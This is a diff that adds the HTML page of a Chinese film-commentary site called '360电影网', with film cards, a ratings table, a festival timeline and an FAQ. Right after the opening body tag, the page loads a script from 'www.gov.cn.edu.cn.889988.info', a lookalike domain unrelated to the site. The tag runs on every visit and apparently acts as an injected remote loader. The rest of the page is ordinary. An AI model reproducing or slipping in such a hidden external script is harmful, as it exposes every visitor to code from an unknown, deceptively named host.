@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>360电影网 — 365天不间断更新的华语院线观察与海外佳作引进报告</title>
+<meta name="keywords" content="360电影网, 华语电影票房口碑, 海外引进片观察, 独立纪录片推荐, 电影节入围名单, 周末观影决策">
+<meta name="description" content="360电影网专注华语院线与海外佳作的双向观察，每日更新票房口碑对照、引进片动态、独立纪录片片单与电影节前线消息，帮观众在120分钟内做出更不后悔的选择。">
+<link rel="canonical" href="https://360dianyingwang-zh.github.io/">
+<style>
+:root{
+  --navy:#101a2b;
+  --navy-2:#1b2a42;
+  --blue:#2f6fd0;
+  --blue-l:#6b9de8;
+  --red:#e0453c;
+  --gold:#f2b544;
+  --bg:#eef1f6;
+  --card:#ffffff;
+  --ink:#161c28;
+  --gray:#5a6474;
+  --line:#dfe4ec;
+  --r:12px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);color:var(--ink);font-size:15px;line-height:1.72;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button{font-family:inherit;border:none;background:none;cursor:pointer}
+img{display:block;max-width:100%}
+
+/* layout */
+.layout{display:grid;grid-template-columns:232px 1fr;min-height:100vh}
+.side{
+  background:linear-gradient(170deg,var(--navy),var(--navy-2));
+  color:#fff;padding:30px 22px;position:sticky;top:0;height:100vh;overflow-y:auto;
+}
+.brand{display:flex;align-items:center;gap:12px;margin-bottom:8px}
+.brand-logo{
+  width:42px;height:42px;border-radius:11px;background:var(--red);
+  display:grid;place-items:center;font-weight:900;font-size:20px;letter-spacing:-1px;
+  box-shadow:0 6px 16px -6px rgba(224,69,60,.7);
+}
+.brand h1{font-size:19px;letter-spacing:.5px}
+.brand small{display:block;font-size:11px;color:#8fa0bd;font-weight:400;letter-spacing:1px;margin-top:2px}
+.side-desc{font-size:12.5px;color:#93a3bb;line-height:1.7;margin:16px 0 26px;padding-bottom:22px;border-bottom:1px solid rgba(255,255,255,.1)}
+
+.nav-label{font-size:11px;letter-spacing:2px;color:#6d7e98;text-transform:uppercase;margin-bottom:10px}
+.side-nav{display:flex;flex-direction:column;gap:2px;margin-bottom:30px}
+.side-nav a{
+  display:flex;align-items:center;gap:12px;padding:11px 14px;border-radius:9px;
+  font-size:14.5px;color:#c3cfe0;transition:.18s;
+}
+.side-nav a:hover{background:rgba(255,255,255,.07);color:#fff}
+.side-nav a i{
+  width:26px;height:26px;border-radius:7px;background:rgba(255,255,255,.08);
+  display:grid;place-items:center;font-size:13px;flex-shrink:0;
+}
+.side-nav a.on{background:var(--red);color:#fff}
+.side-nav a.on i{background:rgba(255,255,255,.2)}
+
+.side-widget{background:rgba(255,255,255,.05);border-radius:var(--r);padding:16px;margin-bottom:16px}
+.side-widget h4{font-size:13px;color:#fff;margin-bottom:12px}
+.hot li{display:flex;gap:10px;padding:7px 0;font-size:13px;color:#b9c5d8;border-bottom:1px dashed rgba(255,255,255,.09)}
+.hot li:last-child{border-bottom:none}
+.hot em{font-style:normal;color:var(--gold);font-weight:700;font-size:12px;min-width:22px}
+.side-foot{font-size:11.5px;color:#6d7e98;line-height:1.7}
+.side-foot b{color:#93a3bb;font-weight:400}
+
+/* main */
+.main{padding:0 0 60px}
+.topbar{
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
+  padding:18px 34px;background:var(--card);border-bottom:1px solid var(--line);flex-wrap:wrap;
+}
+.search{display:flex;align-items:center;gap:10px;background:var(--bg);border:1px solid var(--line);border-radius:24px;padding:8px 16px;flex:1;max-width:420px}
+.search input{border:none;background:none;outline:none;font-size:14px;width:100%;color:var(--ink)}
+.search span{color:var(--gray);font-size:13px}
+.top-actions{display:flex;align-items:center;gap:18px;font-size:13.5px;color:var(--gray)}
+.top-actions a:hover{color:var(--blue)}
+.menu-toggle{display:none}
+
+/* hero ticker */
+.hero{padding:34px 34px 26px}
+.ticker{
+  background:var(--card);border-radius:16px;padding:28px 30px;position:relative;overflow:hidden;
+  border:1px solid var(--line);box-shadow:0 2px 20px -12px rgba(16,26,43,.25);
+}
+.ticker::before{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--red)}
+.ticker .tag{
+  display:inline-block;font-size:11.5px;letter-spacing:1.5px;background:#fdeceb;color:var(--red);
+  padding:4px 12px;border-radius:20px;margin-bottom:14px;font-weight:600;
+}
+.ticker h2{font-size:30px;line-height:1.4;letter-spacing:-.4px;max-width:820px}
+.ticker h2 b{color:var(--blue)}
+.ticker p{color:var(--gray);margin-top:12px;max-width:700px}
+.ticker-stats{display:flex;gap:40px;margin-top:24px;flex-wrap:wrap}
+.ticker-stats div span{display:block;font-size:12px;color:var(--gray)}
+.ticker-stats div b{font-size:24px;font-weight:800;letter-spacing:-.5px}
+
+/* section heads */
+.sec-head{
+  display:flex;align-items:baseline;gap:14px;padding:34px 34px 18px;flex-wrap:wrap;
+}
+.sec-head .num{font-size:12px;font-weight:800;color:#fff;background:var(--navy);padding:3px 9px;border-radius:6px;letter-spacing:1px}
+.sec-head h3{font-size:22px;letter-spacing:-.3px}
+.sec-head em{font-style:normal;font-size:13px;color:var(--gray);margin-left:auto}
+
+/* cards */
+.grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;padding:0 34px}
+.card{background:var(--card);border-radius:var(--r);overflow:hidden;border:1px solid var(--line);transition:.2s}
+.card:hover{transform:translateY(-4px);box-shadow:0 16px 32px -18px rgba(16,26,43,.4);border-color:#c9d4e4}
+.thumb{height:150px;position:relative}
+.thumb::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 55%,rgba(0,0,0,.35))}
+.thumb span{position:absolute;left:12px;bottom:10px;z-index:1;color:#fff;font-size:12px;font-weight:600;text-shadow:0 1px 4px rgba(0,0,0,.4)}
+.k1{background:linear-gradient(135deg,#2b4a7a,#6f9ad0)}
+.k2{background:linear-gradient(135deg,#a4483f,#e39c8f)}
+.k3{background:linear-gradient(135deg,#3d6b5c,#8dbfae)}
+.k4{background:linear-gradient(135deg,#6b5a2f,#c6ad74)}
+.k5{background:linear-gradient(135deg,#4a3a6b,#a392c4)}
+.k6{background:linear-gradient(135deg,#2f6b8f,#7fb8d6)}
+.k7{background:linear-gradient(135deg,#7a4f2f,#d6a47f)}
+.k8{background:linear-gradient(135deg,#5a5a5a,#a8a8a8)}
+.card .body{padding:16px}
+.card .body .cat{font-size:11.5px;color:var(--red);font-weight:600;letter-spacing:.5px}
+.card .body h4{font-size:16.5px;margin:6px 0 8px;line-height:1.45}
+.card .body p{font-size:13.5px;color:var(--gray);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.card .meta{display:flex;justify-content:space-between;padding:12px 16px;border-top:1px solid var(--line);font-size:12px;color:var(--gray)}
+
+/* list table */
+.list-wrap{padding:0 34px}
+.list{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.list li{display:grid;grid-template-columns:56px 1.6fr 1fr 90px 90px;align-items:center;padding:16px 20px;gap:14px;border-bottom:1px solid var(--line)}
+.list li:last-child{border-bottom:none}
+.list li:nth-child(even){background:#fafbfd}
+.list .rank{font-size:22px;font-weight:900;color:var(--line)}
+.list li:nth-child(1) .rank{color:var(--gold)}
+.list li:nth-child(2) .rank{color:#9aa6b6}
+.list li:nth-child(3) .rank{color:#c08a5a}
+.list .ttl b{display:block;font-size:15.5px}
+.list .ttl small{font-size:12px;color:var(--gray)}
+.list .gen{font-size:13px;color:var(--gray)}
+.list .num{font-size:14px;font-weight:700;text-align:right}
+.list .trend{text-align:right;font-size:12.5px;font-weight:600}
+.trend.up{color:#1f9d6b}
+.trend.down{color:var(--red)}
+.trend.flat{color:var(--gray)}
+
+/* two col */
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:18px;padding:0 34px}
+.panel{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:22px 24px}
+.panel h4{font-size:17px;margin-bottom:18px;display:flex;align-items:center;gap:8px}
+.panel h4::before{content:"";width:4px;height:16px;background:var(--blue);border-radius:2px}
+.qa{display:flex;flex-direction:column;gap:10px}
+.qa details{border:1px solid var(--line);border-radius:9px;padding:14px 16px;background:var(--bg)}
+.qa summary{cursor:pointer;font-weight:600;font-size:14.5px}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary::after{content:"▾";float:right;color:var(--gray);font-size:12px}
+.qa details[open] summary::after{transform:rotate(180deg)}
+.qa p{margin-top:10px;font-size:13.5px;color:var(--gray)}
+
+/* timeline */
+.timeline{position:relative;padding-left:26px}
+.timeline::before{content:"";position:absolute;left:6px;top:6px;bottom:6px;width:2px;background:var(--line)}
+.timeline .node{position:relative;padding:0 0 20px}
+.timeline .node::before{content:"";position:absolute;left:-25px;top:6px;width:12px;height:12px;border-radius:50%;background:var(--blue);border:3px solid var(--bg)}
+.timeline .node .when{font-size:12px;color:var(--red);font-weight:700;letter-spacing:1px}
+.timeline .node b{display:block;font-size:15px;margin:3px 0 5px}
+.timeline .node p{font-size:13.5px;color:var(--gray)}
+
+/* footer */
+.foot{background:var(--navy);color:#93a3bb;margin:40px 34px 0;padding:40px;border-radius:16px}
+.foot-grid{display:grid;grid-template-columns:1.5fr 1fr 1fr 1.4fr;gap:34px;padding-bottom:30px;border-bottom:1px solid rgba(255,255,255,.1)}
+.foot-brand{display:flex;gap:12px;align-items:flex-start;color:#fff}
+.foot-brand .brand-logo{width:38px;height:38px;font-size:17px}
+.foot-brand b{font-size:17px;display:block}
+.foot-brand p{font-size:13px;color:#8fa0bd;margin-top:8px;line-height:1.7}
+.foot h5{color:#fff;font-size:14px;margin-bottom:14px}
+.foot ul{display:flex;flex-direction:column;gap:9px;font-size:13.5px}
+.foot ul a:hover{color:#fff}
+.foot-domain input{
+  width:100%;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.14);
+  border-radius:8px;padding:11px 12px;color:#fff;font-size:13px;margin-top:10px;
+}
+.foot-bottom{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;padding-top:22px;font-size:12.5px;color:#6d7e98}
+
+/* responsive */
+@media (max-width:1080px){
+  .grid-4{grid-template-columns:repeat(2,1fr)}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:820px){
+  .layout{grid-template-columns:1fr}
+  .side{position:fixed;left:-260px;top:0;width:250px;z-index:100;transition:.25s}
+  .side.open{left:0}
+  .side-overlay{display:none;position:fixed;inset:0;background:rgba(16,26,43,.5);z-index:99}
+  .side-overlay.show{display:block}
+  .menu-toggle{display:flex;align-items:center;gap:8px;background:var(--navy);color:#fff;padding:9px 16px;border-radius:22px;font-size:13.5px}
+  .topbar{padding:14px 20px}
+  .hero{padding:24px 20px 16px}
+  .ticker{padding:22px 20px}
+  .ticker h2{font-size:23px}
+  .sec-head{padding:26px 20px 14px}
+  .grid-4,.list-wrap,.two-col{padding:0 20px}
+  .grid-4{grid-template-columns:1fr}
+  .two-col{grid-template-columns:1fr}
+  .list li{grid-template-columns:40px 1fr 70px;gap:10px;padding:14px 12px}
+  .list .gen,.list .trend{display:none}
+  .foot{margin:30px 20px 0;padding:28px 22px}
+  .foot-grid{grid-template-columns:1fr}
+  .ticker-stats{gap:24px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="layout">
+  <!-- 侧边栏 -->
+  <aside class="side" id="side">
+    <div class="brand">
+      <div class="brand-logo">360</div>
+      <div>
+        <h1>360电影网</h1>
+        <small>360° 看电影</small>
+      </div>
+    </div>
+    <p class="side-desc">每日更新华语院线口碑、海外引进片动态、纪录片与电影节前线消息，为观众的每一次入场提供决策参考。</p>
+
+    <p class="nav-label">网站栏目</p>
+    <nav class="side-nav">
+      <a href="#daily" class="on"><i>◎</i>每日观察</a>
+      <a href="#boxoffice"><i>◆</i>票房与口碑</a>
+      <a href="#festival"><i>✦</i>电影节前线</a>
+      <a href="#faq"><i>?</i>常见问题</a>
+    </nav>
+
+    <div class="side-widget">
+      <h4>编辑部本周关注</h4>
+      <ul class="hot">
+        <li><em>01</em>华语家庭片在中秋档的票房韧性</li>
+        <li><em>02</em>三部东欧纪录片集中引进</li>
+        <li><em>03</em>县城影院激光厅改造进度</li>
+        <li><em>04</em>海外流媒体十月片单</li>
+      </ul>
+    </div>
+
+    <div class="side-foot">
+      访问地址<br>
+      <b>360dianyingwang-zh.github.io</b>
+    </div>
+  </aside>
+  <div class="side-overlay" id="overlay"></div>
+
+  <!-- 主体 -->
+  <main class="main">
+    <div class="topbar">
+      <button class="menu-toggle" id="menuBtn">☰ 栏目导航</button>
+      <div class="search">
+        <span>🔍</span>
+        <input type="text" placeholder="搜索片名、导演、电影节或题材，如「纪录片」「北欧」">
+      </div>
+      <div class="top-actions">
+        <a href="#daily">每日更新</a>
+        <a href="#boxoffice">票房榜</a>
+        <a href="#festival">投稿爆料</a>
+      </div>
+    </div>
+
+    <!-- Hero -->
+    <section class="hero">
+      <div class="ticker">
+        <span class="tag">每日观察 · 10 月 4 日</span>
+        <h2>一部好电影不该靠热搜才被看见——<b>360电影网</b>用全年不间断的更新，把被忽略的那部分片单重新放回你的面前。</h2>
+        <p>我们不预测票房，只记录真实口碑；不做资讯搬运，只输出看过之后的判断。下方四个栏目覆盖日常选片、票房对照、海外片讯与观众答疑。</p>
+        <div class="ticker-stats">
+          <div><span>连续更新天数</span><b>1,286 天</b></div>
+          <div><span>已发布原创内容</span><b>3,412 篇</b></div>
+          <div><span>本周新增条目</span><b>47 条</b></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目一 -->
+    <div class="sec-head" id="daily">
+      <span class="num">COLUMN 01</span>
+      <h3>每日观察</h3>
+      <em>每天一篇，通勤路上三分钟读完</em>
+    </div>
+    <div class="grid-4">
+      <article class="card">
+        <div class="thumb k1"><span>10/04 · 周日</span></div>
+        <div class="body">
+          <div class="cat">华语院线</div>
+          <h4>中秋档收官：家庭题材持续走稳，喜剧类型出现分化</h4>
+          <p>假期最后两天的场次调整反映出观众对片长的敏感度上升，120 分钟成为分水岭。</p>
+        </div>
+        <div class="meta"><span>阅读 8 分钟</span><b>2,140 次</b></div>
+      </article>
+      <article class="card">
+        <div class="thumb k2"><span>10/03 · 周六</span></div>
+        <div class="body">
+          <div class="cat">海外引进</div>
+          <h4>三部东欧纪录片同期引进，排片空间却只剩早场</h4>
+          <p>题材相近导致宣传互相挤压，发行方仍在沿用老一套物料逻辑。</p>
+        </div>
+        <div class="meta"><span>阅读 6 分钟</span><b>1,608 次</b></div>
+      </article>
+      <article class="card">
+        <div class="thumb k3"><span>10/02 · 周五</span></div>
+        <div class="body">
+          <div class="cat">流媒体</div>
+          <h4>十月上线清单里，真正值得看的是这三部 90 分钟短片集</h4>
+          <p>平台推荐位偏爱大制作，小体量作品只能靠片单栏目被看见。</p>
+        </div>
+        <div class="meta"><span>阅读 5 分钟</span><b>3,021 次</b></div>
+      </article>
+      <article class="card">
+        <div class="thumb k4"><span>10/01 · 周四</span></div>
+        <div class="body">
+          <div class="cat">产业观察</div>
+          <h4>县城影院的激光厅改造：票价没涨，亮度确实上来了</h4>
+          <p>实测数据显示，改造后的银幕均匀度提升明显，尤其利好暗调文艺片。</p>
+        </div>
+        <div class="meta"><span>阅读 9 分钟</span><b>1,877 次</b></div>
+      </article>
+      <article class="card">
+        <div class="thumb k5"><span>09/30 · 周三</span></div>
+        <div class="body">
+          <div class="cat">导演专题</div>
+          <h4>北欧导演的克制美学：用沉默替代台词的四次尝试</h4>
+          <p>长镜头不是炫技，而是把判断权还给观众的一种手段。</p>
+        </div>
+        <div class="meta"><span>阅读 7 分钟</span><b>1,433 次</b></div>
+      </article>
+      <article class="card">
+        <div class="thumb k6"><span>09/29 · 周二</span></div>
+        <div class="body">
+          <div class="cat">设备实测</div>
+          <h4>家用投影仪实测：遮光比参数更重要，别被流明数带偏</h4>
+          <p>三款主流机型在同一房间实测，结论与官方标称存在明显偏差。</p>
+        </div>
+        <div class="meta"><span>阅读 11 分钟</span><b>2,556 次</b></div>
+      </article>
+      <article class="card">
+        <div class="thumb k7"><span>09/28 · 周一</span></div>
+        <div class="body">
+          <div class="cat">影展速报</div>
+          <h4>地方影展的生存方式：靠观众席而不是靠红毯</h4>
+          <p>一场观众提问环节的实录，比任何宣传稿都更能说明问题。</p>
+        </div>
+        <div class="meta"><span>阅读 6 分钟</span><b>1,109 次</b></div>
+      </article>
+      <article class="card">
+        <div class="thumb k8"><span>09/27 · 周日</span></div>
+        <div class="body">
+          <div class="cat">编辑手记</div>
+          <h4>我们为什么不写五星影评：一份评分标准的自我说明</h4>
+          <p>评分应当是可比较的，而不是情绪化的。这是我们的内部校准方式。</p>
+        </div>
+        <div class="meta"><span>阅读 5 分钟</span><b>1,764 次</b></div>
+      </article>
+    </div>
+
+    <!-- 栏目二 -->
+    <div class="sec-head" id="boxoffice">
+      <span class="num">COLUMN 02</span>
+      <h3>票房与口碑对照表</h3>
+      <em>实时整理 · 不含预测性结论</em>
+    </div>
+    <div class="list-wrap">
+      <ul class="list">
+        <li>
+          <span class="rank">01</span>
+          <div class="ttl"><b>《渡口以北》</b><small>剧情 / 家庭 · 126 分钟 · 首周</small></div>
+          <span class="gen">现实题材</span>
+          <span class="num">口碑 8.4</span>
+          <span class="trend up">↑ 稳</span>
+        </li>
+        <li>
+          <span class="rank">02</span>
+          <div class="ttl"><b>《第七次重逢》</b><small>爱情 / 奇幻 · 104 分钟 · 次周</small></div>
+          <span class="gen">奇幻爱情</span>
+          <span class="num">口碑 7.9</span>
+          <span class="trend up">↑ 逆跌</span>
+        </li>
+        <li>
+          <span class="rank">03</span>
+          <div class="ttl"><b>《荞麦面包店》</b><small>治愈 / 日常 · 102 分钟 · 长线放映</small></div>
+          <span class="gen">治愈系</span>
+          <span class="num">口碑 7.7</span>
+          <span class="trend flat">— 平</span>
+        </li>
+        <li>
+          <span class="rank">04</span>
+          <div class="ttl"><b>《编号 11 的证人》</b><small>犯罪 / 庭审 · 127 分钟 · 首周</small></div>
+          <span class="gen">犯罪庭审</span>
+          <span class="num">口碑 8.4</span>
+          <span class="trend up">↑ 升</span>
+        </li>
+        <li>
+          <span class="rank">05</span>
+          <div class="ttl"><b>《屋顶上的邮差》</b><small>喜剧 · 96 分钟 · 第三周</small></div>
+          <span class="gen">轻喜剧</span>
+          <span class="num">口碑 8.1</span>
+          <span class="trend down">↓ 回落</span>
+        </li>
+        <li>
+          <span class="rank">06</span>
+          <div class="ttl"><b>《沉默的海岸线》</b><small>悬疑 · 89 分钟 · 限量放映</small></div>
+          <span class="gen">冷门悬疑</span>
+          <span class="num">口碑 8.3</span>
+          <span class="trend up">↑ 加场</span>
+        </li>
+      </ul>
+    </div>
+
+    <!-- 栏目三 + 栏目四 -->
+    <div class="sec-head" id="festival">
+      <span class="num">COLUMN 03</span>
+      <h3>电影节前线时间线</h3>
+      <em>国际片讯与国内放映计划同步更新</em>
+    </div>
+    <div class="two-col">
+      <div class="panel">
+        <h4>未来三个月重点节点</h4>
+        <div class="timeline">
+          <div class="node">
+            <span class="when">10 月中旬</span>
+            <b>平遥国际电影展 · 藏龙单元</b>
+            <p>三部华语新导演作品进入主竞赛，均为长片首作，题材集中在城乡迁移。</p>
+          </div>
+          <div class="node">
+            <span class="when">11 月初</span>
+            <b>东京国际电影节 · 亚洲未来</b>
+            <p>华语片入选数量回升，独立制片占比超过六成，发行窗口值得关注。</p>
+          </div>
+          <div class="node">
+            <span class="when">11 月下旬</span>
+            <b>金马影展 · 国际青年导演</b>
+            <p>东欧与拉美纪录片集中亮相，部分作品已确定后续引进排期。</p>
+          </div>
+          <div class="node">
+            <span class="when">12 月中</span>
+            <b>海南岛国际电影节</b>
+            <p>产业环节增设「小城放映」专场，直接对接县城影院。</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel" id="faq">
+        <h4>观众常见问题</h4>
+        <div class="qa">
+          <details open>
+            <summary>限量放映的片子，怎么判断会不会加场？</summary>
+            <p>通常看前三天的工作日白天场次上座情况。若连续两场超六成，发行方加场概率较高，可留意当地影院官方号的次周排片公告。</p>
+          </details>
+          <details>
+            <summary>口碑高但场次少，值不值得专程跑一趟？</summary>
+            <p>建议先看片长与题材匹配度。90 分钟内的独立片适合单程一小时内抵达的影院；超过 130 分钟的，最好留出一整天安排。</p>
+          </details>
+          <details>
+            <summary>海外引进片的删改幅度如何提前知道？</summary>
+            <p>正式公映版与电影节版若有差异，通常会在映前一周的媒体场后传出信息。本站会在核实后单独标注，不做推测性对比。</p>
+          </details>
+          <details>
+            <summary>想带孩子看，哪个栏目最有用？</summary>
+            <p>每日观察中的片长、题材与分龄提示是编辑部固定标注项，比单纯看评分更实用，适合快速决策。</p>
+          </details>
+          <details>
+            <summary>投稿与爆料走哪个渠道？</summary>
+            <p>影展从业者与放映员可提交片讯或排片变动线索，核实后会进入当天的每日观察栏目，来源信息一律不外泄。</p>
+          </details>
+        </div>
+      </div>
+    </div>
+
+    <!-- 页脚 -->
+    <footer class="foot">
+      <div class="foot-grid">
+        <div class="foot-brand">
+          <div class="brand-logo">360</div>
+          <div>
+            <b>360电影网</b>
+            <p>一个从 2023 年起持续更新的电影观察站点，内容由看过片子的人写给要看片子的人。</p>
+          </div>
+        </div>
+        <div>
+          <h5>栏目导航</h5>
+          <ul>
+            <li><a href="#daily">每日观察</a></li>
+            <li><a href="#boxoffice">票房与口碑</a></li>
+            <li><a href="#festival">电影节前线</a></li>
+            <li><a href="#faq">常见问题</a></li>
+          </ul>
+        </div>
+        <div>
+          <h5>内容方向</h5>
+          <ul>
+            <li><a href="#">华语院线</a></li>
+            <li><a href="#">海外引进</a></li>
+            <li><a href="#">纪录片</a></li>
+            <li><a href="#">设备实测</a></li>
+          </ul>
+        </div>
+        <div>
+          <h5>站点地址</h5>
+          <p style="font-size:13px">当前访问入口为 GitHub Pages 托管地址：</p>
+          <input type="text" value="https://360dianyingwang-zh.github.io" readonly>
+        </div>
+      </div>
+      <div class="foot-bottom">
+        <span>© 2026 360电影网 · 由影迷与写作者维护</span>
+        <span>本站内容为观影观点分享，不构成任何消费建议或票房预测</span>
+      </div>
+    </footer>
+  </main>
+</div>
+
+<script>
+var btn=document.getElementById('menuBtn');
+var side=document.getElementById('side');
+var overlay=document.getElementById('overlay');
+function close(){side.classList.remove('open');overlay.classList.remove('show')}
+btn.addEventListener('click',function(){side.classList.add('open');overlay.classList.add('show')});
+overlay.addEventListener('click',close);
+side.querySelectorAll('a').forEach(function(a){a.addEventListener('click',close)});
+</script>
+</body>
+</html>
